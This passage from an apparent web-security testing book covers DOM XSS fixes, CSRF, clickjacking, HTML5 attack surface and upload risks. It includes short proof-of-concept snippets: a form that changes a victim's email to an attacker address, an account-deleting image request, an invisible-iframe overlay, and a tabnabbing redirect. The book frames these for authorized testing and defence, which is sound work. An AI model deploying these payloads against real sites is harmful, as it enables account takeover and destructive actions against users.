like `element.innerHTML = someString` throw unless `someString` is a vetted `TrustedHTML`
object produced by a policy you define. This converts "every `innerHTML` is a potential bug" into
"all HTML must pass through a central, auditable sanitizing policy." It's the most effective
structural defense against DOM XSS and is covered in [Chapter 19](#19-csp). As a
tester, note whether Trusted Types is enforced — its absence is a (defense-in-depth) finding for
high-risk apps, and its presence dramatically shrinks the DOM-XSS surface.

## 10.10 Fixing DOM XSS

- **Prefer safe sinks.** Use `textContent`/`innerText` instead of `innerHTML`; set values with
  DOM APIs (`createElement` + `textContent`) rather than HTML string concatenation.
- **For URL sinks, validate the scheme** (allow only `http`/`https`/relative; reject
  `javascript:`/`data:`); for redirects, allow-list destinations.
- **Sanitize HTML you must render** with a vetted client-side sanitizer, and ideally wrap it in a
  Trusted Types policy.
- **Validate `postMessage`**: check `event.origin` against an allow-list and validate `event.data`
  structure before use.
- **Avoid `eval`/`Function`/string `setTimeout`.** Parse JSON with `JSON.parse`, not `eval`.
- **Adopt Trusted Types + strict CSP** for defense in depth.
- **Don't bypass framework protections** without a sanitizer (no raw `dangerouslySetInnerHTML`/
  `v-html`/`bypassSecurityTrust*` on untrusted data).

## 10.11 Lab exercise

Using PortSwigger DOM-XSS labs (excellent for this) or a local page you write:

1. Exploit a `location.search` → `innerHTML` flow.
2. Exploit a `location.hash` → `document.write` flow and confirm the server logs show nothing.
3. Exploit a DOM-based **open redirect**, then escalate it to `javascript:` XSS.
4. Set up two local pages and exploit an **insecure `postMessage`** handler from the "attacker"
   page.
5. Add `Content-Security-Policy: require-trusted-types-for 'script'` to your local page and watch
   the `innerHTML` assignment start throwing — observe the structural fix in action.

---

## Key takeaways

- DOM XSS is a **client-side** flaw: a JS **source** flows to a dangerous **sink** with no
  sanitization, often without the payload ever reaching the server (especially via `#hash`).
- Find it by **reading the JavaScript**: grep for sinks (`innerHTML`, `eval`, `document.write`,
  URL setters, framework escape hatches) and backtrack to sources (`location.*`, `referrer`,
  `window.name`, `postMessage`, storage).
- The payload depends on the **sink type** (HTML-parsing vs code-exec vs URL/navigation).
- Server-side encoding and many WAFs are **blind** to DOM XSS; **CSP** (no `unsafe-inline`/
  `unsafe-eval`) and especially **Trusted Types** are the meaningful structural defenses.
- Fix by preferring safe sinks (`textContent`), validating URL schemes and `postMessage` origins,
  avoiding `eval`, and not bypassing framework escaping.

---

<a id="11-csrf"></a>

# Chapter 11 — CSRF and the Role of HTML Forms

> Cross-Site Request Forgery turns the browser's own helpfulness against the user: because the
> browser automatically attaches cookies to requests, an attacker's page can make the victim's
> browser send an authenticated, state-changing request to a target site. HTML forms (and a few
> other elements) are the engine that fires those requests — which is why CSRF belongs in a book
> about HTML.

---

## 11.1 The core idea

Recall from [Chapter 4](#04-the-dom) that the Same-Origin Policy stops a cross-origin
page from *reading* your responses, but it does **not** stop a cross-origin page from *sending*
requests — and the browser will attach your cookies to those requests anyway. CSRF exploits that
gap:

```
Victim is logged in to bank.example (has a session cookie).
Victim visits attacker.example (or any page the attacker controls content on).
That page silently submits a form to bank.example/transfer.
The browser includes the victim's bank.example cookie automatically.
bank.example sees a valid, authenticated request and performs the action.
```

The attacker never sees the response (SOP blocks that) — but they didn't need to. The point of
CSRF is to cause a **state change** (transfer money, change email/password, add an admin, delete
data), not to read data.

## 11.2 Conditions required for CSRF

A request is CSRF-able when all of these hold:

1. **It performs a meaningful state change** (otherwise there's nothing to forge).
2. **It relies on cookies (or other automatically-sent credentials)** for authentication, with
   no unpredictable per-request secret.
3. **The request parameters are predictable** — the attacker can construct the full request
   without anything they can't know.

If any condition fails — the action is read-only, or it requires a secret token the attacker
can't guess, or it isn't cookie-authenticated — classic CSRF doesn't work.

## 11.3 HTML elements that send cross-site requests

This is the HTML heart of the chapter. Several elements cause the browser to issue requests, and
many do so cross-origin with cookies attached:

**`<form>` — the primary weapon.** A form can auto-submit to any URL:

```html
<!-- Conceptual PoC: auto-submitting cross-site POST. Use only in authorized testing,
     targeting an in-scope, low-impact action you control. -->
<form action="https://target.example/account/email" method="POST" id="f">
  <input type="hidden" name="email" value="attacker@evil.example">
</form>
<script>document.getElementById('f').submit();</script>
```

Key HTML facts that make forms powerful for CSRF:

- Forms submit **`GET` or `POST`** natively (no JS needed for the request itself, though JS is
  used to auto-submit).
- With **`enctype="text/plain"`**, the body is sent almost verbatim, which lets an attacker
  approximate a JSON body (e.g., crafting `{"email":"x@evil.example","ignore":"=...` style
  payloads) to hit some JSON endpoints that don't strictly check `Content-Type`.
- Forms **cannot set custom headers** and can't send `application/json` with arbitrary
  structure — a limitation that underpins several defenses (§11.6).

**Other request-issuing elements** (mostly `GET`, useful when the target action is a GET):
- `<img src="https://target.example/action?x=1">` — fires a GET on load.
- `<iframe src=...>`, `<script src=...>`, `<link href=...>`, `<video>/<audio>/<source>`,
  `<object>/<embed>` — all fetch URLs.
- `<a>` with auto-click, `<meta http-equiv="refresh">`, CSS `url()` in injected styles.

**The practical rule:** if a state-changing action can be triggered by a simple GET, an `<img>`
tag is enough. If it requires POST, an auto-submitting `<form>` is the tool. If it requires
JSON + custom headers + a token, it's likely not CSRF-able.

## 11.4 GET-based CSRF is the easy mode

Any state-changing action exposed over **GET** is a gift to an attacker: it can be triggered by
an `<img>`, a link, or a redirect — no form, no JavaScript, embeddable anywhere user content
appears.

```html
<img src="https://target.example/account/delete?confirm=true" width="1" height="1">
```

This is why **state changes should never be exposed over GET** — a principle that's both a
finding when violated and a remediation (§11.7). During mapping (Chapter 6), flag every GET that
mutates state.

## 11.5 Building and testing a CSRF proof of concept

A responsible CSRF test (in scope, least-impact):

1. **Capture the legitimate request** in your proxy: method, URL, body, content type, and which
   tokens/headers are present.
2. **Identify the auth mechanism**: is it a cookie? Is the cookie `SameSite=Lax/Strict/None`?
3. **Strip non-essential parameters** and any apparent anti-CSRF token, then **replay** the
   request to see whether it still succeeds without the token. (If it succeeds without the
   token, the token isn't actually validated — a finding.)
4. **Construct a self-contained HTML PoC** (a form or `<img>`) that issues the request.
5. **Test as the victim**: in a separate logged-in session (an account you control), load the
   PoC and confirm the action occurs.
6. **Choose a low-impact target action** to demonstrate (toggle a benign preference) where
   possible, per [Chapter 1](#01-legal-and-ethics). Avoid destructive actions and never
   target real users.

Many proxies (Chapter 16) can auto-generate a CSRF PoC from a captured request, which is handy
but always verify it reflects the real request.

## 11.6 Why modern defaults reduced (but didn't eliminate) CSRF

Two big shifts changed the CSRF landscape:

**`SameSite` cookies.** Browsers now default cookies to `SameSite=Lax` when the site doesn't
specify otherwise. `Lax` means the cookie is **not** sent on most cross-site *subrequests*
(like the `<img>`/`<form POST>` an attacker uses), though it *is* sent on top-level GET
navigations the user initiates. This blunts a lot of classic CSRF automatically. But it's not a
complete fix:

- **`SameSite=None`** (often set for cookies that must work in third-party contexts) re-opens
  the door.
- **Lax allows top-level GET navigation**, so GET-based state changes triggered by a full-page
  navigation can still ride the cookie.
- **`SameSite` is per-cookie and per-browser**; older clients and misconfigurations exist.
- **Method/timing edge cases** and the ~2-minute "Lax+POST" intervals some browsers historically
  applied have created windows.

So a tester must still check `SameSite` *per cookie* and not assume the app is safe just because
modern browsers default to `Lax`.

**Token and header-based defenses.** Apps add unpredictable anti-CSRF tokens (synchronizer
tokens) or rely on the fact that forms can't set custom headers or send arbitrary JSON. If an
API requires `Content-Type: application/json` and a custom header (e.g., `X-Requested-With` or a
CSRF token header), a plain HTML form can't forge it — because forms can't set those headers and
can't produce arbitrary JSON bodies (§11.3).

## 11.7 Common CSRF defense flaws to test for

Defenses are often present but broken. Probe each:

- **Token not validated.** Remove it; does the request still work? (Astonishingly common.)
- **Token validated only when present.** Send an empty token or omit the parameter entirely.
- **Token tied to the wrong thing.** Is the token bound to the user's session? Try using your
  own valid token in a request "as" another flow, or reuse a token across users.
- **Token in a place the attacker can influence.** A token read from a cookie and compared to a
  body field (the "double-submit" pattern) can be defeated if the attacker can set the cookie
  (e.g., via a subdomain or a cookie-injection bug).
- **Token leaks** in URLs, `Referer`, or to third parties.
- **Method override.** The app checks the token on POST but accepts the same action via GET or a
  `_method` override field.
- **Content-Type not enforced.** A JSON endpoint that also accepts form-encoded or `text/plain`
  bodies can be hit by a form (§11.3). Test sending the action as `text/plain`/form-encoded.
- **`Referer`/`Origin` checks that fail open.** Some apps validate `Referer`/`Origin` but allow
  the request when the header is *absent*; an attacker can sometimes suppress it (e.g., via
  `rel="noreferrer"`, `meta` referrer policy, or `data:`/HTTPS→HTTP transitions).
- **`SameSite=None` or absent** on the session cookie.
- **CORS misconfig used as CSRF.** A reflective `Access-Control-Allow-Origin` with
  `Allow-Credentials: true` can turn into cross-origin *reading* — adjacent to CSRF and worth
  noting.

## 11.8 Login CSRF and logout CSRF

CSRF isn't only about authenticated victims acting on their own account:

- **Login CSRF**: the attacker forges a *login* request that logs the victim into the
  *attacker's* account. The victim then unknowingly operates in the attacker's account — saving
  payment details, search history, or files that the attacker later retrieves. Defenses (CSRF
  tokens) must cover the login form too, which developers often forget.
- **Logout CSRF**: forcibly logging the victim out (low impact alone, but useful in chains).

## 11.9 CSRF as a building block in chains

CSRF rarely stands alone in high-impact reports. It chains:

- **CSRF → self-stored-XSS escalation.** If an app has a "self-XSS" that only affects your own
  account, CSRF can place that payload into a *victim's* account, converting self-XSS into a
  real attack.
- **CSRF → account takeover.** Forge an email-change or password-reset-initiation request, then
  take over via the attacker-controlled email.
- **CSRF + clickjacking.** When a token blocks pure CSRF, clickjacking (Chapter 12) can trick the
  user into performing the action through the real UI, which carries the token.

## 11.10 Detecting CSRF (procedure)

1. From the Chapter 6 map, list **state-changing** actions.
2. For each: identify auth mechanism, presence/validation of anti-CSRF token, cookie `SameSite`,
   accepted methods, and accepted content types.
3. Replay the request **without** the token / with it emptied; observe.
4. Try **method/content-type downgrades** (POST→GET, JSON→form/`text/plain`).
5. Build a minimal HTML PoC for any action that still succeeds; verify as a controlled victim.
6. Record severity by **impact of the action** (email change, money, admin) and **ease of
   delivery**.

## 11.11 Fixing CSRF

Layered defenses (details in [Chapter 18](#18-defense-remediation)):

- **Anti-CSRF tokens**: per-session (or per-request) unpredictable tokens, bound to the user's
  session, validated server-side on every state-changing request, and **rejected when missing**.
- **`SameSite` cookies**: set session cookies to `SameSite=Lax` (or `Strict` where UX allows);
  avoid `None` unless genuinely needed, and pair `None` with tokens.
- **Never expose state changes over GET**; require POST/PUT/DELETE with proper protections.
- **Validate `Origin`/`Referer`** as a secondary check, failing **closed** when the header
  indicates a cross-site origin.
- **Require non-forgeable request shapes** for sensitive APIs (custom header + JSON content type,
  enforced server-side) so HTML forms can't reproduce them.
- **Re-authenticate** for the most sensitive actions (password/email change, large transfers).

The deepest point: CSRF is the price of *ambient authority* — credentials the browser sends
automatically. Defenses work by adding something the attacker's HTML *cannot* supply (an
unpredictable token, a custom header, a `SameSite` restriction).

---

## Key takeaways

- CSRF abuses the browser auto-attaching cookies: a cross-site page makes the victim send an
  authenticated **state-changing** request. SOP blocks reading the response, but the action still
  happens.
- **HTML forms** (GET/POST, `enctype=text/plain`) and request-issuing elements (`<img>`,
  `<iframe>`, `<script>`...) are the engine. **State changes over GET are trivially forgeable.**
- `SameSite=Lax` defaults reduced classic CSRF but didn't kill it — check `SameSite` **per
  cookie**, test `None`, top-level GET navigations, and content-type/method downgrades.
- Test for **broken** defenses: unvalidated/empty/reusable tokens, cookie-settable double-submit,
  fail-open `Origin` checks, and JSON endpoints that accept form/`text/plain`.
- Fix with session-bound anti-CSRF tokens (rejected when missing), `SameSite` cookies, no
  state-change-over-GET, `Origin`/`Referer` validation, and re-auth for sensitive actions.

---

<a id="12-clickjacking"></a>

# Chapter 12 — Clickjacking and UI Redressing

> Clickjacking weaponizes a single HTML element — the `<iframe>` — plus a little CSS. The
> attacker frames a real, sensitive page invisibly over (or under) decoy content, so the
> victim's genuine clicks land on the target's controls. No script injection into the target is
> needed; the target's own UI is the attack surface.

---

## 12.1 The concept

"UI redressing" is the umbrella term; clickjacking is the best-known form. The attacker:

1. Loads the target site inside an `<iframe>` on a page they control.
2. Uses CSS to make the frame **transparent** and **positioned** over enticing decoy content
   (a game, a "claim your prize" button, a video).
3. Aligns the decoy so the victim's clicks/keystrokes actually hit a sensitive control in the
   hidden target frame (a "Delete account," "Confirm transfer," "Grant permission," or
   "Authorize app" button).

The victim believes they're interacting with the attacker's harmless page; in reality they're
operating the real target site **while logged in**, so the actions are authenticated and
genuine. Because the click happens in the real UI, it carries real anti-CSRF tokens — which is
why clickjacking can succeed where CSRF is blocked.

## 12.2 The minimal anatomy

A conceptual clickjacking page (for use only against an in-scope target in your lab):

```html
<style>
  iframe {
    position: absolute; top: 0; left: 0;
    width: 1000px; height: 800px;
    opacity: 0.0;            /* invisible target frame */
    z-index: 2;              /* on top */
  }
  #decoy {
    position: absolute; z-index: 1;   /* underneath */
  }
  #bait {
    position: absolute; z-index: 3;   /* visual lure, positioned under the real button */
  }
</style>

<div id="decoy">Win a free prize! Click the button below 🎁</div>
<button id="bait">CLAIM PRIZE</button>
<iframe src="https://target.example/account/delete"></iframe>
```

The craft is in the **alignment**: positioning the frame so the invisible "Delete account"
button sits exactly under the visible "CLAIM PRIZE" lure. Attackers tune `top`/`left`/scale and
sometimes scroll the frame to bring a specific control into the click zone.

Two opacity strategies:
- **Transparent overlay** (`opacity: 0`): the real frame is on top but invisible; the user sees
  the decoy and clicks "through" to the frame.
- **Decoy on top with a hole / partial opacity**: variations where the bait is layered to direct
  the click precisely.

## 12.3 Variants of UI redressing

- **Classic clickjacking** — hijacking a click on a sensitive button.
- **Likejacking** — historically, tricking users into clicking social "Like"/follow buttons.
- **Cursorjacking** — using a custom CSS cursor to misrepresent where the real pointer is, so the
  user aims wrong.
- **Keystroke/strokejacking** — framing a target field and luring the user to type (e.g., into a
  decoy form) so input lands in the framed page.
- **Content redressing / partial overlays** — covering parts of a legitimate page with attacker
  content to change its apparent meaning (e.g., hiding the real recipient of a payment).
- **Drag-and-drop attacks** — luring the user to drag a token/text from one frame to another to
  exfiltrate or fill fields.
- **Double-clickjacking** — timing a UI change between the two clicks of a double-click so the
  second click lands on a control that appeared mid-gesture (a more recent twist that can evade
  some framing protections by acting within a user-initiated gesture window).

## 12.4 Why it works: framing is allowed by default

By default, the browser will happily render one origin's page inside another origin's
`<iframe>`. The Same-Origin Policy stops the *parent* from reading the *child* frame's contents,
but it does **not** stop the framing itself, and it does **not** stop clicks from reaching the
framed page. Clickjacking lives precisely in this allowed-by-default behavior — the same "SOP
restricts reading, not embedding" asymmetry from [Chapter 4](#04-the-dom).

So unless a site *opts out* of being framed, it's potentially clickjackable. That opt-out is the
whole defense (§12.7).

## 12.5 What makes a page a good clickjacking target

When triaging, prioritize pages where:

- A **single click performs a sensitive, irreversible, or valuable action** (delete, confirm,
  authorize, transfer, grant OAuth scope, change a setting).
- The action is **idempotent from one click** (no multi-step confirmation that breaks alignment).
- The page **can be framed** (no `X-Frame-Options` / CSP `frame-ancestors`).
- The user is **likely logged in** when they'd encounter the lure.

OAuth/consent screens, "delete/disable" actions, payment confirmations, and admin toggles are
classic high-value targets.

## 12.6 Detecting clickjacking (procedure)

1. **Check framing headers** on the target response:
   - `X-Frame-Options: DENY` or `SAMEORIGIN` → framing restricted.
   - `Content-Security-Policy: frame-ancestors 'none'` (or a specific allow-list) → modern,
     stronger control (and the one that takes precedence on modern browsers).
   - **Neither present** → likely frameable.
2. **Try to frame it** in a local test page in your lab. If the page renders inside your
   `<iframe>`, it's frameable. (Some pages use *frame-busting JavaScript* instead of headers; see
   §12.8.)
3. **Identify a sensitive single-click control** on the framed page.
4. **Build an alignment PoC** that visually demonstrates the lure overlapping the control. To
   keep it ethical, you generally **do not** need to actually trick a real person — proving the
   page frames *and* that a decoy can be aligned over a sensitive button is sufficient evidence.
   Capture a screenshot showing the overlap (e.g., with the frame at partial opacity so the
   reviewer can see both layers).
5. **Report** with the headers (or their absence), the frameability proof, and the specific
   sensitive action at risk.

> Many proxies include a clickjacking helper that frames a captured page so you can confirm
> frameability and produce a PoC quickly (Chapter 16).

## 12.7 The real defense: tell the browser not to frame you

Two mechanisms (use the CSP one as primary on modern browsers; keep XFO for legacy):

- **`Content-Security-Policy: frame-ancestors 'none';`** — forbids *all* framing.
  `frame-ancestors 'self';` allows only same-origin framing; `frame-ancestors https://trusted.example;`
  allows a specific list. This is the modern, flexible, and recommended control, and it
  supersedes `X-Frame-Options` where both are present.
- **`X-Frame-Options: DENY`** (or `SAMEORIGIN`) — the older header. Still useful for older
  browsers, but it can't express multiple allowed origins cleanly and is effectively legacy.

Apply these to **every** sensitive page (and ideally site-wide as a default), and verify they're
actually emitted on the responses that matter — not just the home page.

## 12.8 Why frame-busting JavaScript is not enough

Before headers existed, sites used "frame busters" — JS that detects framing
(`if (top !== self) top.location = self.location`) and breaks out. These are historically
**bypassable**:

- `sandbox`ed iframes can disable the framed page's scripts (`<iframe sandbox>` without
  `allow-scripts`), so the buster never runs — yet clicks may still register depending on the
  configuration; at minimum, script-based busting is neutralized.
- Various navigation/`onbeforeunload` tricks and timing races defeated older busters.

The lesson: **frame protection must be enforced by the browser via headers/CSP**, not by
JavaScript that the framing page can suppress. If you find a target relying solely on
frame-busting JS, that's a finding — note that it's bypassable and recommend `frame-ancestors`.

## 12.9 Interaction with cookies and CSRF

Clickjacking and CSRF are cousins:

- Both are **cross-site** attacks that don't require breaking SOP's read restriction.
- CSRF forges the *request*; clickjacking induces the *user* to make the request through the
  real UI.
- This is why clickjacking can defeat **anti-CSRF tokens**: the framed real page includes its
  own valid token, and the victim's genuine click submits it.
- `SameSite` cookies interact here too: because clickjacking often involves the user clicking in
  a framed top-... actually a subframe, cookie behavior depends on `SameSite` and whether the
  action is a navigation or subrequest. Test the actual flow rather than assuming.

For sensitive actions, the robust answer combines **`frame-ancestors`** (stop framing) with
**re-authentication or explicit confirmation** that's resistant to single-click hijacking.

## 12.10 Lab exercise

In your lab (use a local app you control, e.g., DVWA which includes a clickjacking-friendly
target, or your own page framing a local sensitive form):

1. Check whether the target page sends `X-Frame-Options`/`frame-ancestors`.
2. Build a local page that frames it; confirm it renders.
3. Overlay a decoy button and align it (visually) over a sensitive control; set the frame to
   `opacity: 0.3` so you can see the alignment, then to `0` to show the finished illusion.
4. Add `Content-Security-Policy: frame-ancestors 'none'` to the target's responses (if you
   control it) and confirm the frame now refuses to load — observe the fix.
5. Write up the finding as you would in a report: header status, frameability proof, the
   at-risk action, and the remediation.

---

## Key takeaways

- Clickjacking frames a real, sensitive page invisibly and lures the victim's genuine clicks
  onto it — abusing the fact that **framing is allowed by default** and SOP doesn't stop clicks
  reaching a framed page.
- Because the click happens in the **real UI**, clickjacking can succeed where CSRF tokens block
  request forgery.
- Detect by checking for `X-Frame-Options` / CSP `frame-ancestors`; if absent, confirm
  frameability in a lab. A benign PoC just needs to **show the overlap**, not trick a real user.
- The real defense is **`Content-Security-Policy: frame-ancestors`** (with `X-Frame-Options` for
  legacy), applied to every sensitive page. **Frame-busting JavaScript is bypassable** and not a
  substitute.

---

<a id="13-html5-features"></a>

# Chapter 13 — HTML5 Features and Their Security Impact

> "HTML5" loosely names the modern web platform: new elements, attributes, and a wave of
> JavaScript APIs. Each convenience added new attack surface. This chapter surveys the features
> a tester must understand — not as a list of trivia, but organized by *how each one expands what
> an attacker can do*.

---

## 13.1 New elements and attributes that carry event handlers

HTML5 added media and interactive elements, and crucially gave many of them **event handler
attributes** that fire without `<script>` — invaluable when `<script>` is filtered (Chapter 8):

- `<video>`, `<audio>` with `onerror`, `onloadstart`, etc.
- `<source>` inside media elements.
- `<details>`/`<summary>` with `ontoggle` (fires on open/close).
- `<svg>` with `onload` (a workhorse XSS vector — Chapter 14).
- Animation-driven handlers: CSS animations + `onanimationstart`/`onanimationend`,
  `<svg>` `<animate>`.

And the perennial favorites that need no user interaction:

- **`autofocus` + `onfocus`** on an `<input>`/`<textarea>`/`<select>` → zero-click trigger.
- **`<img onerror>`** with a broken `src` → fires immediately on parse.

For a tester, the takeaway is that the set of "things that can run code in markup" is far larger
than `<script>` and inline `on*` on a handful of tags. Modern filters that block `<script>` and
a few handlers routinely miss `ontoggle`, `onanimationstart`, media `onerror`, and
`autofocus`/`onfocus`.

## 13.2 `<iframe sandbox>` and `srcdoc` — both a defense and a vector

The `sandbox` attribute restricts what a framed document can do (disable scripts, forms,
popups, top-navigation, same-origin treatment) unless you re-enable capabilities with tokens
like `allow-scripts`, `allow-forms`, `allow-same-origin`, `allow-top-navigation`,
`allow-popups`, `allow-modals`.

Security relevance both ways:

- **As a defense:** sandboxing untrusted embedded content (ads, user HTML) limits blast radius.
  But a dangerous combination is **`allow-scripts allow-same-origin` together** — that lets the
  framed content run script *and* treat itself as same-origin, so it can reach out and remove its
  own sandbox or access the embedding origin's resources, defeating the point. Flag this combo.
- **As a vector:** `<iframe srcdoc="...">` lets you specify a whole document inline. If you can
  inject into a page, an injected `<iframe srcdoc="&lt;script&gt;...&lt;/script&gt;">` is a way
  to spawn an executing document — and `srcdoc` content is HTML-entity-decoded, which interacts
  with filters in useful (to an attacker) ways.

## 13.3 Web Storage: `localStorage` and `sessionStorage`

HTML5 added client-side key/value storage. Security implications:

- **No `HttpOnly` equivalent.** Anything in Web Storage is readable by *any* same-origin
  JavaScript, so **any XSS reads all of it.** Storing session tokens/JWTs in `localStorage` is
  convenient but means XSS = token theft. Cookies with `HttpOnly` at least resist JS reads.
- **Persistence.** `localStorage` survives browser restarts; a token or PII stored there lingers.
- **Stored DOM XSS.** If attacker-influenced data is written to storage and later read into a
  sink (Chapter 10), you get persistence without a server. Test read paths from storage.
- **Shared across tabs/subdomain nuances.** Storage is per-origin; understand the boundary when
  assessing leakage.

As a tester: inspect `localStorage`/`sessionStorage` (DevTools → Application) on authenticated
pages. Tokens or PII there is a finding, and it raises the severity of any XSS you find.

## 13.4 Cross-document messaging: `postMessage`

Covered as a DOM-XSS source in [Chapter 10](#10-xss-dom), but it belongs in the HTML5
survey too. The two recurring bugs:

- **Receivers that don't check `event.origin`** → any page can drive the handler.
- **Senders that post to `'*'`** → messages (possibly containing secrets/tokens) are delivered
  to whatever origin currently occupies the target frame, leaking data to a malicious framer.

Audit both directions: who can send to this handler, and where does this sender's data go?

## 13.5 CORS: relaxing the Same-Origin Policy on purpose

Cross-Origin Resource Sharing lets a server opt in to cross-origin *reading* of its responses.
It's not HTML per se, but it changes the SOP boundary that all HTML attacks operate against.
Misconfigurations are common and impactful:

- **Reflective `Access-Control-Allow-Origin`** that echoes the request's `Origin` **plus**
  `Access-Control-Allow-Credentials: true` → any origin can read authenticated responses (mass
  data theft). This is a frequent critical finding.
- **`Access-Control-Allow-Origin: *` with credentials** is disallowed by spec, but **trusting
  `null`** (which sandboxed iframes and some redirects send as Origin) is a real bypass.
- **Weak origin matching** (substring/regex that allows `evil-target.example` or
  `target.example.evil.com`).

Test CORS by sending crafted `Origin` headers and observing the `Access-Control-*` response
headers. While adjacent to CSRF, CORS misconfig is about *reading*, which can be even worse.

## 13.6 Content embedding: `<object>`, `<embed>`, and media

Legacy-ish but still present:

- `<object>`/`<embed>` can load documents and historically plugins; they offer alternative
  vectors when `<iframe>`/`<script>` are filtered, and can load `data:`/SVG content.
- Media elements (`<video>`, `<audio>`) carry event handlers (§13.1) and can fetch cross-origin
  resources (CSRF-style GETs).

## 13.7 Navigation and link features: `target=_blank` and tabnabbing

A subtle but widespread issue:

```html
<a href="https://untrusted.example" target="_blank">open</a>
```

Historically, the newly opened page received a `window.opener` reference to the original page
and could redirect it (`window.opener.location = 'https://phish.example'`) — **reverse
tabnabbing**: the user clicks a link, a new tab opens, and meanwhile the *original* tab is
silently navigated to a phishing clone. Modern browsers now imply `rel="noopener"` for
`target=_blank`, mitigating this by default, but:

- Older browsers and some configurations still expose `opener`.
- Programmatic `window.open` may still pass an opener unless handled.

Recommend explicit `rel="noopener noreferrer"` on outbound `target=_blank` links and verify it's
present on links to untrusted destinations.

## 13.8 Form features: `formaction`, `autocomplete`, `pattern` (recap)

From Chapter 5, but reinforced as HTML5 surface:

- **`formaction`/`formmethod`/`formenctype`** on submit buttons override the form's target —
  injection or control of these can redirect submissions (credential theft) per button.
- **Client-side validation** (`pattern`, `required`, `type=email/url`) is advisory only.
- **`autocomplete`** behavior is a minor data-exposure consideration on sensitive fields.

## 13.9 Other capability APIs (relevant post-exploitation or for privacy)

These mostly require script execution to abuse (so they amplify XSS) or are gated by
permissions/secure contexts, but a tester should know they exist:

- **Service Workers** — scriptable network proxies that **persist**. An attacker who can run
  same-origin script (e.g., via XSS) can register a service worker for durable control of the
  origin's traffic, surviving the original XSS. Their availability dramatically raises XSS
  severity. Check whether the origin registers service workers and whether the registration
  surface is protected.
- **WebSockets / EventSource** — long-lived channels; check for missing origin validation on the
  server side (cross-site WebSocket hijacking) and for message-handling sinks.
- **Geolocation, Notifications, Camera/Mic (getUserMedia), Clipboard** — permission-gated; abuse
  generally needs script + user consent, but consent can be socially engineered.
- **Fullscreen API** — can aid UI-redress/phishing by hiding browser chrome.
- **Drag-and-drop API** — relevant to UI-redress (Chapter 12) data exfiltration.
- **`window.name`** — persists across navigations; a cross-origin source (Chapter 10).

## 13.10 The `<meta>` element's powers

`<meta>` is small but mighty and appears in injections:

- **`<meta http-equiv="refresh" content="0;url=...">`** — a script-free redirect; an open-redirect
  / phishing primitive when injectable.
- **`<meta http-equiv="Content-Security-Policy" content="...">`** — CSP can be set via meta;
  conversely, if an attacker can inject a `<meta>` CSP early, they might *weaken* policy in some
  cases, or you might use a meta CSP as a remediation where headers are hard to set.
- **`<meta name="referrer" content="...">`** — controls `Referer` sending; relevant to
  token/secret leakage and to suppressing `Referer` for `Origin`/`Referer`-based CSRF checks.
- **`<meta charset>`** — encoding control (Chapter 3 charset attacks).

## 13.11 Testing checklist for HTML5 surface

- [ ] Are non-`<script>` event-handler vectors filtered? (`ontoggle`, media `onerror`,
      `onanimationstart`, `autofocus`+`onfocus`).
- [ ] Any `<iframe sandbox>` with `allow-scripts allow-same-origin` together? Any injectable
      `srcdoc`?
- [ ] Are tokens/PII stored in `localStorage`/`sessionStorage`? (raises XSS impact)
- [ ] Do `postMessage` receivers check `origin`? Do senders post to `'*'`?
- [ ] Is CORS reflective/credentialed/`null`-trusting/weak-matching?
- [ ] Do `target=_blank` links to untrusted sites use `rel="noopener"`?
- [ ] Are `formaction`/`formmethod` overrides exploitable?
- [ ] Does the origin register **service workers**? Is that surface protected?
- [ ] Any injectable `<meta http-equiv>` (refresh/CSP/referrer)?

## 13.12 Fixing HTML5-feature risks (pointers)

- Filter/escape on output regardless of element type; don't enumerate "bad tags" — allow-list.
- Never combine `allow-scripts` and `allow-same-origin` for untrusted sandboxed content.
- Prefer **cookies with `HttpOnly`+`Secure`+`SameSite`** over `localStorage` for session tokens.
- Validate `event.origin` in `postMessage` handlers; target a specific origin when sending.
- Lock down CORS: explicit allow-list, never reflect arbitrary origins with credentials, don't
  trust `null`.
- Add `rel="noopener noreferrer"` to outbound `target=_blank` links.
- Protect service-worker and WebSocket surfaces (origin checks server-side).
- Set a strong CSP (Chapter 19) — it constrains many of these vectors at once.

---

## Key takeaways

- HTML5 multiplied the set of **markup-based code-execution vectors** beyond `<script>`
  (`ontoggle`, media `onerror`, `onanimationstart`, `autofocus`+`onfocus`, `<svg onload>`).
- **`localStorage`/`sessionStorage`** have no `HttpOnly` analog — any XSS reads them; storing
  tokens there raises XSS severity.
- **`postMessage`** and **CORS** redraw the cross-origin boundary; missing origin checks and
  reflective/credentialed CORS are high-impact misconfigurations.
- **`iframe sandbox`** helps, but `allow-scripts allow-same-origin` together defeats it;
  `srcdoc` is also an injection vector.
- Watch **tabnabbing** (`target=_blank` → `rel=noopener`), **`<meta>`** powers (refresh/CSP/
  referrer/charset), and **service workers** (durable post-XSS persistence).

---

<a id="14-uploads-svg-markup"></a>

# Chapter 14 — Dangerous Uploads, SVG, and Markup Tricks

> This chapter collects the "markup that arrives through unexpected doors" attacks: files that
> the browser later parses as HTML, SVG's deceptively rich scripting surface, and a grab-bag of
> parser tricks that defeat naive filters. The unifying theme: **any path that lets attacker
> bytes be interpreted as markup in the target origin is an XSS path.**

---

## 14.1 Why uploads are an HTML problem

A file upload feels unrelated to HTML — until you ask: *how is the file served back, and how
does the browser interpret it?* If an attacker can upload content that the browser later renders
as HTML **in the target's origin**, that's stored XSS by another name. The danger points:

1. **Content type the server assigns when serving the file.** If an uploaded `.html` (or a file
   the server labels `text/html`) is served from the app's origin, opening it runs its script
   in that origin.
2. **MIME sniffing.** Without `X-Content-Type-Options: nosniff`, browsers may *sniff* a file's
   content and decide it's HTML even if the server said otherwise — turning an "image" that
   actually contains `<script>` into an HTML page.
3. **SVG and HTML-bearing formats** that are legitimately served inline (next sections).
4. **Filename and metadata** reflected into listings (stored XSS via filename).
5. **Storage location/origin.** Files served from the *same origin* as the app are dangerous;
   files served from a separate sandbox origin or with `Content-Disposition: attachment` are
   safer.

## 14.2 The `accept` attribute is not a control

`<input type="file" accept="image/*">` only *hints* to the file picker. It does nothing
server-side and is trivially bypassed by submitting any file via a proxy. Likewise,
client-side checks of file extension or the picker's MIME are advisory. **All upload validation
must be server-side**, and content type must be verified by inspecting bytes, not by trusting the
client-declared type or extension.

## 14.3 Polyglots and content-type confusion

Attackers craft files that are **valid as two formats at once** (polyglots) so they pass an
"is this a real image?" check yet still get interpreted as HTML/script when served or sniffed:

- A **GIF/JPEG with HTML/JS appended or embedded** that, if served as `text/html` or sniffed,
  executes. Image parsers ignore trailing junk; HTML parsers find the markup.
- A file whose **magic bytes** say "image" but whose body contains `<script>` — defeats checks
  that only validate the header.

The defense combinations (see §14.9) are: validate content properly, set correct
